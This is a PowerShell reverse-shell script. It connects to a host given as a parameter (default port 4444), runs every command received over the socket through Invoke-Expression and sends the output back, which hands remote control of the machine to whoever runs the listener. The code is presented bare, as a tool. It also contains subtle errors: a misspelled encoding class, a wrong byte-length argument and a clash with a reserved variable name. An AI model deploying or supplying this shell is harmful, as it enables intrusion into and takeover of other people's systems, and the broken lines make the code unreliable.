param(
    [Parameter(Mandatory=$true)][string]$host,
    [string]$port = "4444"
)
$client = New-Object System.Net.Sockets.TCPClient($host, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([test.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendback.Length)
    $stream.Flush()
}
$client.Close()
